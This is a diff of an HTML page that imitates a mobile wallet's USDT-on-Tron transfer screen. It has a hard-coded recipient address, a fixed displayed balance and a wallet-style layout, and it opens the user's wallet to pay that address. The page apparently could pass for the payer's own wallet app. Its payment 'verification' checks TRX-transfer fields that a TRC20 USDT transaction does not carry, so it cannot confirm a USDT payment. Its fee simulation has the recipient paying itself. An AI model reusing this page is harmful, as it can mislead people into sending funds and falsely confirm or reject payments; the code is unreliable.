@@ -4,474 +4,349 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>USDT 转账</title>
+    <!-- 引入 TronWeb 库 -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
     <style>
         :root {
-            --bg-color: #f2f3f5; /* 整体背景灰 */
-            --card-bg: #ffffff;
-            --text-main: #111111;
-            --text-sub: #888888;
-            --primary-blue: #b3d4ff; /* 浅蓝色按钮背景 */
-            --primary-blue-text: #007aff; /* 深蓝色文字 */
-            --primary-blue-active: #68a8ff;
-            --success-green: #34c759;
+            --bg-color: #f2f3f5; --card-bg: #ffffff; --text-main: #111111; --text-sub: #888888;
+            --primary-blue: #b3d4ff; --primary-blue-active: #68a8ff; --success-green: #34c759;
         }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background-color: #e5e5e5; /* 外围背景 */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* 模拟手机屏幕容器 */
-        .app-container {
-            background-color: var(--bg-color);
-            width: 100%;
-            max-width: 400px;
-            height: 100vh;
-            max-height: 850px;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-
-        /* 顶部导航栏 */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 20px;
-            padding-top: 40px; /* 模拟刘海屏留白 */
-        }
-
-        .header .icon {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-            fill: #333;
-        }
-
-        .header-title {
-            text-align: center;
-        }
-
-        .header-title h1 {
-            font-size: 17px;
-            font-weight: 500;
-            color: var(--text-main);
-        }
-
-        .header-title p {
-            font-size: 12px;
-            color: var(--text-sub);
-            margin-top: 2px;
-        }
-
-        /* 主要内容滚动区 */
-        .main-content {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-        }
-
-        /* 标签文字 */
-        .section-label {
-            font-size: 14px;
-            color: var(--text-sub);
-            margin-bottom: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        /* 收款地址卡片 */
-        .address-card {
-            background-color: #e5e6e8;
-            border-radius: 12px;
-            padding: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-
-        .address-text {
-            font-size: 15px;
-            color: var(--text-main);
-            word-break: break-all;
-            line-height: 1.4;
-            padding-right: 12px;
-        }
-
-        .copy-btn {
-            background: none;
-            border: none;
-            cursor: pointer;
-            padding: 4px;
-        }
-
-        .copy-btn svg {
-            width: 20px;
-            height: 20px;
-            fill: var(--success-green);
-        }
-
-        /* 添加到地址本按钮 */
-        .add-address-btn {
-            background-color: #cce0ff;
-            border-radius: 12px;
-            padding: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-            cursor: pointer;
-        }
-
-        .add-address-left {
-            display: flex;
-            align-items: center;
-            color: #1a73e8;
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .add-address-left svg {
-            width: 20px;
-            height: 20px;
-            margin-right: 8px;
-            fill: #1a73e8;
-        }
-
-        .add-address-right svg {
-            width: 16px;
-            height: 16px;
-            fill: #1a73e8;
-        }
-
-        /* 数量区域卡片 */
-        .amount-card {
-            background-color: var(--card-bg);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 24px;
-        }
-
-        /* 大号输入框 */
-        .amount-input {
-            width: 100%;
-            border: none;
-            outline: none;
-            font-size: 48px;
-            font-weight: 400;
-            color: var(--text-main);
-            background: transparent;
-            margin-bottom: 20px;
-            font-family: inherit;
-        }
-
-        .amount-input::placeholder {
-            color: #cccccc;
-        }
-
-        /* 隐藏输入框的上下箭头 */
-        .amount-input::-webkit-outer-spin-button,
-        .amount-input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-
-        .note-text {
-            font-size: 14px;
-            color: var(--text-sub);
-            border-top: 1px solid #f0f0f0;
-            padding-top: 16px;
-        }
-
-        /* 矿工费卡片 */
-        .fee-card {
-            background-color: var(--card-bg);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 16px;
-        }
-
-        .fee-top {
-            display: flex;
-            flex-direction: column;
-            margin-bottom: 16px;
-        }
-
-        .fee-price {
-            font-size: 20px;
-            font-weight: 600;
-            color: var(--text-main);
-            margin-bottom: 4px;
-        }
-
-        .fee-dropdown {
-            font-size: 14px;
-            color: var(--text-sub);
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-        }
-
-        .fee-dropdown svg {
-            width: 16px;
-            height: 16px;
-            margin-left: 4px;
-            fill: #666;
-        }
-
-        /* 资源切换按钮 */
-        .fee-toggles {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-
-        .toggle-btn {
-            flex: 1;
-            padding: 12px 0;
-            border-radius: 8px;
-            border: none;
-            font-size: 14px;
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.2s;
-        }
-
-        .toggle-btn.active {
-            background-color: #cce0ff;
-            color: #1a73e8;
-            font-weight: 500;
-        }
-
-        .toggle-btn.inactive {
-            background-color: #f2f3f5;
-            color: var(--text-sub);
-        }
-
-        .fee-desc {
-            font-size: 13px;
-            color: var(--text-sub);
-        }
-
-        /* 底部按钮 */
-        .footer {
-            padding: 20px;
-            background-color: var(--bg-color);
-        }
-
-        .submit-btn {
-            width: 100%;
-            background-color: var(--primary-blue);
-            color: #ffffff;
-            border: none;
-            padding: 18px 0;
-            border-radius: 12px;
-            font-size: 17px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        .submit-btn:active {
-            background-color: var(--primary-blue-active);
-        }
-
-        /* 复制成功提示 */
-        .toast {
-            position: fixed;
-            bottom: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(0,0,0,0.7);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-            z-index: 1000;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #e5e5e5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        .toast.show {
-            opacity: 1;
-        }
+        .app-container { background-color: var(--bg-color); width: 100%; max-width: 400px; height: 100vh; max-height: 850px; display: flex; flex-direction: column; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; padding-top: 40px; }
+        .header .icon { width: 24px; height: 24px; cursor: pointer; fill: #333; }
+        .header-title { text-align: center; }
+        .header-title h1 { font-size: 17px; font-weight: 500; color: var(--text-main); }
+        .header-title p { font-size: 12px; color: var(--text-sub); margin-top: 2px; }
+
+        .main-content { flex: 1; overflow-y: auto; padding: 20px; }
+        .section-label { font-size: 14px; color: var(--text-sub); margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        
+        .address-card { background-color: #e5e6e8; border-radius: 12px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+        .address-text { font-size: 15px; color: var(--text-main); word-break: break-all; line-height: 1.4; padding-right: 12px; }
+        .copy-btn { background: none; border: none; cursor: pointer; padding: 4px; }
+        .copy-btn svg { width: 20px; height: 20px; fill: var(--success-green); }
+
+        .add-address-btn { background-color: #cce0ff; border-radius: 12px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; cursor: pointer; }
+        .add-address-left { display: flex; align-items: center; color: #1a73e8; font-size: 15px; font-weight: 500; }
+        .add-address-left svg { width: 20px; height: 20px; margin-right: 8px; fill: #1a73e8; }
+
+        .amount-card { background-color: var(--card-bg); border-radius: 12px; padding: 20px; margin-bottom: 24px; }
+        .amount-input { width: 100%; border: none; outline: none; font-size: 48px; font-weight: 400; color: var(--text-main); background: transparent; margin-bottom: 20px; }
+        .amount-input::placeholder { color: #cccccc; }
+        .amount-input::-webkit-outer-spin-button, .amount-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .note-text { font-size: 14px; color: var(--text-sub); border-top: 1px solid #f0f0f0; padding-top: 16px; }
+
+        .fee-card { background-color: var(--card-bg); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+        .fee-top { display: flex; flex-direction: column; margin-bottom: 16px; }
+        .fee-price { font-size: 20px; font-weight: 600; color: var(--text-main); margin-bottom: 4px; }
+        .fee-dropdown { font-size: 14px; color: var(--text-sub); display: flex; align-items: center; }
+        
+        .fee-toggles { display: flex; gap: 10px; margin-bottom: 16px; }
+        .toggle-btn { flex: 1; padding: 12px 0; border-radius: 8px; border: none; font-size: 14px; cursor: pointer; text-align: center; transition: all 0.2s; }
+        .toggle-btn.active { background-color: #cce0ff; color: #1a73e8; font-weight: 500; }
+        .toggle-btn.inactive { background-color: #f2f3f5; color: var(--text-sub); }
+        .fee-desc { font-size: 13px; color: var(--text-sub); line-height: 1.4; }
+
+        .footer { padding: 20px; background-color: var(--bg-color); }
+        .submit-btn { width: 100%; background-color: var(--primary-blue); color: #ffffff; border: none; padding: 18px 0; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
+        
+        .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background-color: rgba(0,0,0,0.7); color: white; padding: 10px 20px; border-radius: 20px; font-size: 14px; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 1000; }
+        .toast.show { opacity: 1; }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; justify-content: center; align-items: center; z-index: 2000; }
+        .modal-content { background: white; width: 85%; max-width: 340px; border-radius: 16px; padding: 20px; text-align: center; }
+        .modal-content h3 { margin-bottom: 10px; font-size: 18px; }
+        .modal-content p { font-size: 13px; color: var(--text-sub); margin-bottom: 15px; }
+        .txid-input { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; outline: none; }
+        .modal-btns { display: flex; gap: 10px; }
+        .modal-btn { flex: 1; padding: 12px; border-radius: 8px; border: none; font-size: 15px; cursor: pointer; }
+        .btn-cancel { background: #f0f0f0; color: #333; }
+        .btn-confirm { background: #007aff; color: white; }
     </style>
 </head>
 <body>
 
     <div class="app-container">
-        <!-- 头部 -->
         <header class="header">
-            <!-- 返回箭头 -->
-            <svg class="icon" viewBox="0 0 24 24">
-                <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
-            </svg>
+            <svg class="icon" viewBox="0 0 24 24"><path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/></svg>
             <div class="header-title">
                 <h1>USDT 转账</h1>
                 <p>Tron</p>
             </div>
-            <!-- 扫码图标 -->
-            <svg class="icon" viewBox="0 0 24 24">
-                <path d="M3 5v4h2V5h4V3H5c-1.1 0-2 .9-2 2zm2 10H3v4c0 1.1.9 2 2 2h4v-2H5v-4zm14 4h-4v2h4c1.1 0 2-.9 2-2v-4h-2v4zm0-16h-4v2h4v4h2V5c0-1.1-.9-2-2-2zM7 7h10v10H7z"/>
-            </svg>
+            <svg class="icon" viewBox="0 0 24 24"><path d="M3 5v4h2V5h4V3H5c-1.1 0-2 .9-2 2zm2 10H3v4c0 1.1.9 2 2 2h4v-2H5v-4zm14 4h-4v2h4c1.1 0 2-.9 2-2v-4h-2v4zm0-16h-4v2h4v4h2V5c0-1.1-.9-2-2-2zM7 7h10v10H7z"/></svg>
         </header>
 
-        <!-- 内容区 -->
         <main class="main-content">
-            <!-- 收款地址 -->
             <div class="section-label">收款地址</div>
             <div class="address-card">
-                <!-- 【已修改此处地址】 -->
                 <div class="address-text" id="walletAddress">TP2bosCJtezY3bUTUUinChyWSVp7KpsocA</div>
-                <button class="copy-btn" id="copyBtn" title="复制地址">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
-                    </svg>
+                <button class="copy-btn" id="copyBtn">
+                    <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
                 </button>
             </div>
 
-            <!-- 添加到地址本 -->
             <div class="add-address-btn">
                 <div class="add-address-left">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-                    </svg>
+                    <svg viewBox="0 0 24 24"><path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                     添加到地址本
-                </div>
-                <div class="add-address-right">
-                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
                 </div>
             </div>
 
-            <!-- 数量 (自定义输入区) -->
             <div class="section-label">
                 <span>数量</span>
                 <span style="color: var(--text-main); font-weight: 500;">87.8985 USDT</span>
             </div>
             <div class="amount-card">
-                <!-- 这里是大号输入框，用户可以输入金额 -->
                 <input type="number" class="amount-input" id="amountInput" placeholder="0" autocomplete="off">
                 <div class="note-text">备注 (需支付 1 TRX)</div>
             </div>
 
-            <!-- 矿工费 -->
             <div class="section-label">矿工费</div>
             <div class="fee-card">
                 <div class="fee-top">
-                    <div class="fee-price">$ 0</div>
-                    <div class="fee-dropdown">
-                        0 TRX
-                        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
+                    <div class="fee-price" id="feePrice">$ 0.00</div>
+                    <div class="fee-dropdown" id="feeTrx">0 TRX <svg width="16" height="16" viewBox="0 0 24 24" style="margin-left:4px;fill:#666;"><path d="M7 10l5 5 5-5z"/></svg></div>
                 </div>
                 <div class="fee-toggles">
                     <button class="toggle-btn active" id="btnEnergy">消耗资源</button>
                     <button class="toggle-btn inactive" id="btnBurn">燃烧 TRX</button>
                 </div>
-                <div class="fee-desc" id="feeDesc">账户资源充足，本次转账仅消耗资源</div>
+                <div class="fee-desc" id="feeDesc">请输入转账金额以自动计算手续费</div>
             </div>
         </main>
 
-        <!-- 底部按钮 -->
         <footer class="footer">
             <button class="submit-btn" id="submitBtn">下一步</button>
         </footer>
     </div>
 
-    <!-- 提示框 -->
-    <div class="toast" id="toast">地址已复制</div>
+    <div class="modal-overlay" id="verifyModal">
+        <div class="modal-content">
+            <h3>验证交易</h3>
+            <p>请在钱包付款后，复制交易哈希 (TxID) 粘贴至下方进行验证。</p>
+            <input type="text" class="txid-input" id="txidInput" placeholder="输入交易哈希 (TxID)">
+            <div class="modal-btns">
+                <button class="modal-btn btn-cancel" id="cancelVerify">取消</button>
+                <button class="modal-btn btn-confirm" id="confirmVerify">查证</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast">提示信息</div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // 1. 复制地址功能
-            const copyBtn = document.getElementById('copyBtn');
-            const toast = document.getElementById('toast');
-            // 获取更新后的地址文本
-            const walletAddress = document.getElementById('walletAddress').innerText.replace(/\n/g, ''); 
+        // --- 配置区 ---
+        const TO_ADDRESS = 'TP2bosCJtezY3bUTUUinChyWSVp7KpsocA'; 
+        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
+        const TRON_API = 'https://api.trongrid.io'; 
+        
+        const tronWeb = new TronWeb({ fullHost: TRON_API });
 
-            copyBtn.addEventListener('click', async () => {
+        document.addEventListener('DOMContentLoaded', function() {
+            const amountInput = document.getElementById('amountInput');
+            const feePrice = document.getElementById('feePrice');
+            const feeTrx = document.getElementById('feeTrx');
+            const feeDesc = document.getElementById('feeDesc');
+            const btnEnergy = document.getElementById('btnEnergy');
+            const btnBurn = document.getElementById('btnBurn');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            let isBurnTRX = false;
+            let currentTRXPrice = 0.12; // 默认 TRX 价格备份
+            let debounceTimer;
+
+            // 获取实时 TRX 价格
+            async function fetchTRXPrice() {
                 try {
-                    await navigator.clipboard.writeText(walletAddress);
-                    showToast('地址已复制');
-                } catch (err) {
-                    // 降级方案
-                    const textArea = document.createElement('textarea');
-                    textArea.value = walletAddress;
-                    document.body.appendChild(textArea);
-                    textArea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textArea);
-                    showToast('地址已复制');
+                    const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=TRXUSDT');
+                    const data = await res.json();
+                    currentTRXPrice = parseFloat(data.price);
+                } catch (e) {
+                    console.log("获取TRX价格失败，使用默认值");
+                }
+            }
+            fetchTRXPrice();
+
+            // 复制地址
+            document.getElementById('copyBtn').addEventListener('click', () => {
+                navigator.clipboard.writeText(TO_ADDRESS).then(() => showToast('地址已复制'));
+            });
+
+            // 核心：真实计算手续费
+            async function calculateRealFee() {
+                const amount = parseFloat(amountInput.value);
+                
+                if (!amount || amount <= 0) {
+                    feePrice.innerText = '$ 0.00';
+                    feeTrx.innerText = '0 TRX';
+                    feeDesc.innerText = '请输入转账金额以自动计算手续费';
+                    feeDesc.style.color = 'var(--text-sub)';
+                    return;
+                }
+
+                feeDesc.innerText = '正在向波场节点估算能量消耗...';
+                feeDesc.style.color = '#007aff';
+
+                try {
+                    // 1. 获取能量单价 (通常为 420 Sun/Energy)
+                    const params = await tronWeb.trx.getChainParameters();
+                    const energyFeeParam = params.find(p => p.key === 'getEnergyFee');
+                    const energyPrice = energyFeeParam ? energyFeeParam.value : 420; 
+
+                    // 2. 模拟调用合约，获取消耗的能量 (Energy)
+                    // 注意：这里我们使用收款地址作为模拟调用者（最坏情况）
+                    const parameter = [
+                        {type: 'address', value: TO_ADDRESS},
+                        {type: 'uint256', value: amount * 1000000} // USDT 6位小数
+                    ];
+                    
+                    const result = await tronWeb.transactionBuilder.triggerConstantContract(
+                        USDT_CONTRACT, 
+                        "transfer(address,uint256)", 
+                        {}, 
+                        parameter, 
+                        TO_ADDRESS 
+                    );
+
+                    let energyUsed = result.energy_used || 0;
+                    let needActivate = false;
+
+                    // 如果收款地址未激活，模拟执行会报错，通常需要额外 ~2.5万 能量去激活
+                    if (energyUsed === 0 || result.result.result === false) {
+                        energyUsed = 65000; // 未激活地址的默认最大能量估算
+                        needActivate = true;
+                    }
+
+                    // 3. 计算消耗的 TRX
+                    const trxCost = (energyUsed * energyPrice) / 1000000;
+                    const usdCost = trxCost * currentTRXPrice;
+
+                    // 4. 渲染 UI
+                    feePrice.innerText = `$ ${usdCost.toFixed(2)}`;
+                    feeTrx.innerText = `~${trxCost.toFixed(2)} TRX`;
+                    
+                    if (isBurnTRX) {
+                        feeDesc.innerText = `当前账户若无能量，将直接燃烧扣除手续费。`;
+                        feeDesc.style.color = '#ff3b30';
+                    } else {
+                        // 选择“消耗资源”时，显示它值多少钱
+                        feeDesc.innerText = `预估消耗 ${energyUsed} 能量 (约价值 $${usdCost.toFixed(2)})。`;
+                        if (needActivate) feeDesc.innerText += ` (包含激活新地址费用)`;
+                        feeDesc.style.color = 'var(--text-sub)';
+                    }
+
+                } catch (error) {
+                    console.error("计算异常", error);
+                    // 防崩溃降级
+                    const fallbackTrx = 13.5;
+                    feePrice.innerText = `$ ${(fallbackTrx * currentTRXPrice).toFixed(2)}`;
+                    feeTrx.innerText = `~${fallbackTrx} TRX`;
+                    feeDesc.innerText = '节点繁忙，此为预估最大手续费。';
+                    feeDesc.style.color = '#ff3b30';
+                }
+            }
+
+            // 输入框防抖处理 (防止用户狂打字导致API被封IP)
+            amountInput.addEventListener('input', function() {
+                if (this.value && parseFloat(this.value) > 0) {
+                    submitBtn.style.backgroundColor = '#007aff';
+                } else {
+                    submitBtn.style.backgroundColor = 'var(--primary-blue)';
+                }
+                
+                clearTimeout(debounceTimer);
+                debounceTimer = setTimeout(() => {
+                    calculateRealFee();
+                }, 800); // 停止输入 800ms 后开始计算
+            });
+
+            // 切换矿工费模式
+            btnEnergy.addEventListener('click', () => {
+                isBurnTRX = false;
+                btnEnergy.classList.add('active'); btnEnergy.classList.remove('inactive');
+                btnBurn.classList.add('inactive'); btnBurn.classList.remove('active');
+                calculateRealFee();
+            });
+
+            btnBurn.addEventListener('click', () => {
+                isBurnTRX = true;
+                btnBurn.classList.add('active'); btnBurn.classList.remove('inactive');
+                btnEnergy.classList.add('inactive'); btnEnergy.classList.remove('active');
+                calculateRealFee();
+            });
+
+            // 下一步唤醒钱包
+            submitBtn.addEventListener('click', () => {
+                const amount = parseFloat(amountInput.value);
+                if (!amount || amount <= 0) {
+                    showToast('请输入正确的转账金额');
+                    return;
+                }
+                const uri = `tron:${TO_ADDRESS}?amount=${amount}&token=${USDT_CONTRACT}`;
+                window.location.href = uri;
+
+                setTimeout(() => {
+                    document.getElementById('verifyModal').style.display = 'flex';
+                }, 2000);
+            });
+
+            // 验证逻辑
+            document.getElementById('cancelVerify').addEventListener('click', () => {
+                document.getElementById('verifyModal').style.display = 'none';
+            });
+
+            document.getElementById('confirmVerify').addEventListener('click', async () => {
+                const txid = document.getElementById('txidInput').value.trim();
+                if (txid.length !== 64) {
+                    showToast('请输入正确的 64 位交易哈希');
+                    return;
+                }
+                showToast('正在查询链上数据...');
+                try {
+                    const response = await fetch(`${TRON_API}/wallet/gettransactionbyid`, {
+                        method: 'POST',
+                        body: JSON.stringify({ value: txid })
+                    });
+                    const tx = await response.json();
+                    if (!tx || !tx.txID) { showToast('交易不存在或节点未同步'); return; }
+                    
+                    if (tx.ret && tx.ret[0].contractRet === 'SUCCESS') {
+                        const contract = tx.raw_data.contract[0].parameter.value;
+                        const toHex = tronWeb.address.toHex(TO_ADDRESS).toLowerCase();
+                        const targetHex = contract.to_address.toLowerCase();
+                        
+                        if (toHex === targetHex) {
+                            const txAmount = contract.amount / 1000000;
+                            if (txAmount >= parseFloat(amountInput.value)) {
+                                document.getElementById('verifyModal').style.display = 'none';
+                                showToast('✅ 支付成功！已验证。');
+                                submitBtn.innerText = '已完成支付';
+                                submitBtn.style.backgroundColor = '#34c759';
+                                submitBtn.disabled = true;
+                            } else {
+                                showToast(`金额不符，实际收到 ${txAmount} USDT`);
+                            }
+                        } else {
+                            showToast('错误：收款地址不匹配！');
+                        }
+                    } else {
+                        showToast('交易失败，或尚未被区块确认');
+                    }
+                } catch (error) {
+                    showToast('查询失败，请检查网络');
                 }
             });
 
             function showToast(message) {
+                const toast = document.getElementById('toast');
                 toast.innerText = message;
                 toast.classList.add('show');
-                setTimeout(() => {
-                    toast.classList.remove('show');
-                }, 2000);
+                setTimeout(() => toast.classList.remove('show'), 2500);
             }
-
-            // 2. 矿工费切换逻辑
-            const btnEnergy = document.getElementById('btnEnergy');
-            const btnBurn = document.getElementById('btnBurn');
-            const feeDesc = document.getElementById('feeDesc');
-            const feePrice = document.querySelector('.fee-price');
-            const feeTrx = document.querySelector('.fee-dropdown');
-
-            btnEnergy.addEventListener('click', () => {
-                btnEnergy.classList.add('active');
-                btnEnergy.classList.remove('inactive');
-                btnBurn.classList.add('inactive');
-                btnBurn.classList.remove('active');
-                
-                feePrice.innerText = '$ 0';
-                feeTrx.innerHTML = `0 TRX <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>`;
-                feeDesc.innerText = '账户资源充足，本次转账仅消耗资源';
-                feeDesc.style.color = 'var(--text-sub)';
-            });
-
-            btnBurn.addEventListener('click', () => {
-                btnBurn.classList.add('active');
-                btnBurn.classList.remove('inactive');
-                btnEnergy.classList.add('inactive');
-                btnEnergy.classList.remove('active');
-                
-                feePrice.innerText = '$ 1.24';
-                feeTrx.innerHTML = `~13.5 TRX <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>`;
-                feeDesc.innerText = '当前账户无充足资源，将扣除 TRX 作为手续费';
-                feeDesc.style.color = '#ff3b30'; 
-            });
-
-            // 3. 输入金额交互
-            const amountInput = document.getElementById('amountInput');
-            const submitBtn = document.getElementById('submitBtn');
-
-            amountInput.addEventListener('input', function() {
-                if (this.value && parseFloat(this.value) > 0) {
-                    submitBtn.style.backgroundColor = '#007aff'; 
-                    submitBtn.style.color = '#ffffff';
-                } else {
-                    submitBtn.style.backgroundColor = 'var(--primary-blue)'; 
-                }
-            });
         });
     </script>
 </body>
